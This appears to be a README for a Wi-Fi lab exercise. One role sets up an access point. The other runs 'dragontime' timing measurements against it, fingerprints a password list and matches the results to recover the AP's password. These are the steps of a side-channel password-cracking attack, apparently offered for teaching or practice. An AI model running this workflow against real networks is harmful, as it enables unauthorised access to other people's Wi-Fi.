## Admin

Please ```cd``` into the admin folder.

Before starting, run:
```
sudo sh setup_admin.sh
```

After the initial setup, you usually don't need to run the setup again.

When you want to start the AP, run:
```
sudo sh run_admin.sh wlan0
```
You can replace "wlan0" with the Wi-Fi adapter of your choice. 


## Player

Please ```cd``` into the user folder.

Before starting, run:
```
sudo sh setup_user.sh {AP_MAC_VALUE} {WLAN_ADAPTER}  
```
You need to replace ```{AP_MAC_VALUE}``` with the AP's MAC, and ```{WLAN_ADAPTER}``` with the relevant Wi-Fi adapter (usually wlan0).

To start taking measurements, run:
```
sudo ./dragontime -d $(<DEVICE) -a $(<MAC_AP) -o measurements/PASSWORD.txt
```
You can replace "PASSWORD" with your chosen filename.
After getting 50-100 measurements, stop dragontime with CTRL+C.

To generate fingerprints for passwords, run:
```
./fingerprint ../passwords.txt out.csv
```
The fingerprints will be saved to out.csv. 

After getting measurements and fingerprints, run:
```
python find_matches.py measurements/PASSWORD.txt out.csv
```
